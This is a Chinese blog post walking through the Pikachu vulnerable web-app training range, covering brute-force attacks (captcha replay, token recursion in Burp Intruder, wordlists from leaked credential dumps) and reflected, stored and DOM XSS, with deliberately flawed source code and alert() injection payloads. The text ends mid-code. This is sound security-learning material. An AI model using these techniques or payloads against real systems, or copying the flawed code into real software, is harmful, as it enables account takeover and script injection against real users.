<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.cat.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Fira Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"swanq.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="前言最近需要找实习了，来Pikachu靶场再复习一下重要类型的漏洞，具体搭建指南网上应有尽有，此处不再赘述。 Burt Force相关：安全认证策略:用户密码设置是否足够复杂 每次认证是否使用安全验证码 对尝试登陆的行为是否进行判断和限制(连续5次错误登陆锁定账号等) 是否采用双因素认证 经验：暴力破解流程 找到登录接口的脆弱性 尝试登录—抓包—观察验证元素和response，判断是否可以暴力破解">
<meta property="og:type" content="article">
<meta property="og:title" content="pikachu靶场通关指南(一)">
<meta property="og:url" content="http://swanq.top/2021/04/28/pikachu/index.html">
<meta property="og:site_name" content="SwanQ&#39;s Blue SKY">
<meta property="og:description" content="前言最近需要找实习了，来Pikachu靶场再复习一下重要类型的漏洞，具体搭建指南网上应有尽有，此处不再赘述。 Burt Force相关：安全认证策略:用户密码设置是否足够复杂 每次认证是否使用安全验证码 对尝试登陆的行为是否进行判断和限制(连续5次错误登陆锁定账号等) 是否采用双因素认证 经验：暴力破解流程 找到登录接口的脆弱性 尝试登录—抓包—观察验证元素和response，判断是否可以暴力破解">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/1.png">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/2.jpg">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/3.png">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/3.jpg">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/4.jpg">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/5.jpg">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/6.jpg">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/7.jpg">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/9.jpg">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/8.jpg">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/10.jpg">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/11.jpg">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/4.png">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/5.png">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/12.jpg">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/13.jpg">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/6.png">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/7.png">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/8.png">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/9.png">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/10.png">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/11.png">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/12.png">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/15.jpg">
<meta property="og:image" content="http://swanq.top/2021/04/28/pikachu/14.jpg">
<meta property="article:published_time" content="2021-04-28T08:05:10.000Z">
<meta property="article:modified_time" content="2021-05-04T03:34:00.209Z">
<meta property="article:author" content="swanQ">
<meta property="article:tag" content="XSS">
<meta property="article:tag" content="CSRF">
<meta property="article:tag" content="SSRF">
<meta property="article:tag" content="sql injection">
<meta property="article:tag" content="Brute Force">
<meta property="article:tag" content="file uploads">
<meta property="article:tag" content="over permission">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://swanq.top/2021/04/28/pikachu/1.png">

<link rel="canonical" href="http://swanq.top/2021/04/28/pikachu/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>pikachu靶场通关指南(一) | SwanQ's Blue SKY</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">SwanQ's Blue SKY</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">TO LIVE IS TO RISK IT ALL</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">58</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">28</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/28/pikachu/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          pikachu靶场通关指南(一)
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-28 16:05:10" itemprop="dateCreated datePublished" datetime="2021-04-28T16:05:10+08:00">2021-04-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-04 11:34:00" itemprop="dateModified" datetime="2021-05-04T11:34:00+08:00">2021-05-04</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.3k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近需要找实习了，来Pikachu靶场再复习一下重要类型的漏洞，具体搭建指南网上应有尽有，此处不再赘述。</p>
<h1 id="Burt-Force"><a href="#Burt-Force" class="headerlink" title="Burt Force"></a>Burt Force</h1><h3 id="相关："><a href="#相关：" class="headerlink" title="相关："></a>相关：</h3><p>安全认证策略:<br>用户密码设置是否足够复杂</p>
<p>每次认证是否使用安全验证码</p>
<p>对尝试登陆的行为是否进行判断和限制(连续5次错误登陆锁定账号等)</p>
<p>是否采用双因素认证</p>
<h3 id="经验："><a href="#经验：" class="headerlink" title="经验："></a>经验：</h3><h4 id="暴力破解流程"><a href="#暴力破解流程" class="headerlink" title="暴力破解流程"></a>暴力破解流程</h4><ul>
<li>找到登录接口的脆弱性<ul>
<li>尝试登录—抓包—观察验证元素和response，判断是否可以暴力破解</li>
</ul>
</li>
<li>优化字典</li>
<li>自动化工具</li>
</ul>
<h4 id="生成高效字典"><a href="#生成高效字典" class="headerlink" title="生成高效字典"></a>生成高效字典</h4><ul>
<li>比如常用的用户名/密码TOP500</li>
<li>脱裤后的账号密码（社工库）</li>
<li>根据特定的对象（比如手机、生日和银行卡号等）按照指定的规则来生成密码</li>
</ul>
<h4 id="字典优化技巧"><a href="#字典优化技巧" class="headerlink" title="字典优化技巧"></a>字典优化技巧</h4><ul>
<li>根据注册提示进行优化，如注册要求密码8位以上，就去掉少于8位的密码</li>
<li>爆破管理后台时，账号是 admin / administrator / root 的可能性较高</li>
</ul>
<h2 id="验证码绕过-on-server-服务器"><a href="#验证码绕过-on-server-服务器" class="headerlink" title="验证码绕过(on server)服务器"></a>验证码绕过(on server)服务器</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;用户名不能为空&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;密码不能为空&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;vcode&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$html</span> .= <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;验证码不能为空哦！&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//              验证验证码是否正确</span></span><br><span class="line">                <span class="keyword">if</span> (strtolower(<span class="variable">$_POST</span>[<span class="string">&#x27;vcode&#x27;</span>]) != strtolower(<span class="variable">$_SESSION</span>[<span class="string">&#x27;vcode&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$html</span> .= <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;验证码输入错误哦！&lt;/p&gt;&quot;</span>;</span><br><span class="line">                    <span class="comment">//应该在验证完成后,销毁该$_SESSION[&#x27;vcode&#x27;]</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">                    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">                    <span class="variable">$vcode</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;vcode&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$sql</span> = <span class="string">&quot;select * from users where username=? and password=md5(?)&quot;</span>;</span><br><span class="line">                    <span class="variable">$line_pre</span> = <span class="variable">$link</span>-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$line_pre</span>-&gt;bind_param(<span class="string">&#x27;ss&#x27;</span>,<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$line_pre</span>-&gt;execute())&#123;</span><br><span class="line">                        <span class="variable">$line_pre</span>-&gt;store_result();</span><br><span class="line">                        <span class="comment">//虽然前面做了为空判断,但最后,却没有验证验证码!!!</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$line_pre</span>-&gt;num_rows()==<span class="number">1</span>)&#123;</span><br><span class="line">                            <span class="variable">$html</span>.=<span class="string">&#x27;&lt;p&gt; login success&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="variable">$html</span>.= <span class="string">&#x27;&lt;p&gt; username or password is not exists～&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$html</span>.= <span class="string">&#x27;&lt;p&gt;执行错误:&#x27;</span>.<span class="variable">$line_pre</span>-&gt;errno.<span class="string">&#x27;错误信息:&#x27;</span>.<span class="variable">$line_pre</span>-&gt;error.<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码中比较完验证码后，并没有销毁该验证码。所以猜测验证码一直有效，可以不停重放数据包。</p>
<p>所以可以通过验证码重放，来绕过验证码爆破用户民共和密码。</p>
<p><img src="/2021/04/28/pikachu/1.png"></p>
<p><img src="/2021/04/28/pikachu/2.jpg"></p>
<p><img src="/2021/04/28/pikachu/3.png"></p>
<p>成功爆破出目前pikachu的用户及密码</p>
<h2 id="验证码绕过-on-client-服务器"><a href="#验证码绕过-on-client-服务器" class="headerlink" title="验证码绕过(on client)服务器"></a>验证码绕过(on client)服务器</h2><p>可以看到用js生成随机字符作为验证码候选，然后创建验证码并进行验证。所以在本案例下，可利用知道用户名或密码的前提下，可以对另一个参数进行暴力枚举。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> code; <span class="comment">//在全局 定义验证码</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createCode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> codeLength = <span class="number">5</span>;<span class="comment">//验证码的长度</span></span><br><span class="line">        <span class="keyword">var</span> checkCode = <span class="built_in">document</span>.getElementById(<span class="string">&quot;checkCode&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> selectChar = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>);<span class="comment">//所有候选组成验证码的字符，当然也可以用中文的</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; codeLength; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> charIndex = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">36</span>);</span><br><span class="line">            code += selectChar[charIndex];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//alert(code);</span></span><br><span class="line">        <span class="keyword">if</span> (checkCode) &#123;</span><br><span class="line">            checkCode.className = <span class="string">&quot;code&quot;</span>;</span><br><span class="line">            checkCode.value = code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> inputCode = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#bf_client .vcode&#x27;</span>).value;</span><br><span class="line">        <span class="keyword">if</span> (inputCode.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            alert(<span class="string">&quot;请输入验证码！&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inputCode != code) &#123;</span><br><span class="line">            alert(<span class="string">&quot;验证码输入错误！&quot;</span>);</span><br><span class="line">            createCode();<span class="comment">//刷新验证码</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    createCode();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Token防爆破"><a href="#Token防爆破" class="headerlink" title="Token防爆破"></a>Token防爆破</h2><p>抓包发现有 token</p>
<p><img src="/2021/04/28/pikachu/3.jpg"></p>
<p>Repeater后可以看到返回包里有新的 token，即下一次登陆要使用的 token 值在此次登陆的返回包里，而且是明文传输，所以爆破时一定是单线程。</p>
<p><img src="/2021/04/28/pikachu/4.jpg"></p>
<p>intruder模块：设置Grep Extract</p>
<p><img src="/2021/04/28/pikachu/5.jpg"></p>
<p>设置线程为1</p>
<p><img src="/2021/04/28/pikachu/6.jpg"></p>
<p><img src="/2021/04/28/pikachu/7.jpg"></p>
<p>添加返回包里的 token 值，有效载荷选递归搜索</p>
<p><img src="/2021/04/28/pikachu/9.jpg"></p>
<p>成功爆破</p>
<p><img src="/2021/04/28/pikachu/8.jpg"></p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>对XSS的熟悉程度取决于对浏览器机制和HTML、JS的了解程度。这部分涉及内容较多，需要多加练习。</p>
<h2 id="反射型XSS-get"><a href="#反射型XSS-get" class="headerlink" title="反射型XSS(get)"></a>反射型XSS(get)</h2><p>比较好绕过，F12更改输入框maxlength，或者直接在URL中补全&lt;/script&gt;即可。js代码正确即可被浏览器执行。</p>
<p><img src="/2021/04/28/pikachu/10.jpg"></p>
<h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><p>此处同上，只不过URL不显示</p>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>注入语句会写入数据库中，每次进入都会执行</p>
<p>同上</p>
<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>DOM: Document Object Model文档对象模型，DOM型XSS是一种特殊类型的反射型XSS。</p>
<p>当网页到达浏览器，浏览器会为网页创建一个Document object文档对象，然后生成各个子文档对象，其中<strong>每个页面元素对应一个文档对象</strong>，每个文档对象包含属性、方法和事件。</p>
<p>我们可以通过JS脚本对文档对象进行编辑从而修改页面的元素。<strong>客户端脚本程序可以通过DOM来动态修改页面内容，客户端获取DOM中的数据并在本地执行</strong>。基于此，JS脚本就可以用来实现XSS。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;xssd_main&quot;</span>&gt;</span><br><span class="line">               &lt;script&gt;</span><br><span class="line">                   <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                       <span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">&quot;text&quot;</span>).value;</span><br><span class="line">                       <span class="built_in">document</span>.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line">                   <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line">               &lt;/script&gt;</span><br><span class="line">               &lt;!--<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>--&gt;</span></span><br><span class="line"><span class="xml">               <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">               <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;click me!&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;domxss()&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">               <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;dom&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">           <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>通过 getElementById 获取到了标签 Id 为 text的内容赋值给str</p>
<p>  然后又把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，而a标签会写到<strong>Id 为 dom</strong>的 div 标签中。</p>
<p>因此通过闭合的方式构造Payload</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=alert(&quot;xss&quot;)&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/28/pikachu/11.jpg"></p>
<p>DOM型XSS不经过后台交互，前端输入被DOM给获取，通过DOM又在前端输出</p>
<h2 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;xssd_main&quot;</span>&gt;</span><br><span class="line">                &lt;script&gt;</span><br><span class="line">                    <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                        <span class="keyword">var</span> str = <span class="built_in">window</span>.location.search;</span><br><span class="line">                        <span class="keyword">var</span> txss = <span class="built_in">decodeURIComponent</span>(str.split(<span class="string">&quot;text=&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">                        <span class="keyword">var</span> xss = txss.replace(<span class="regexp">/\+/g</span>,<span class="string">&#x27; &#x27;</span>);</span><br><span class="line"><span class="comment">//                        alert(xss);</span></span><br><span class="line"></span><br><span class="line">                        <span class="built_in">document</span>.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+xss+<span class="string">&quot;&#x27;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line">                    <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line">                &lt;/script&gt;</span><br><span class="line">                &lt;!--<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>--&gt;</span></span><br><span class="line">                &lt;form method=&quot;get&quot;&gt;</span><br><span class="line">                &lt;input id=&quot;text&quot; 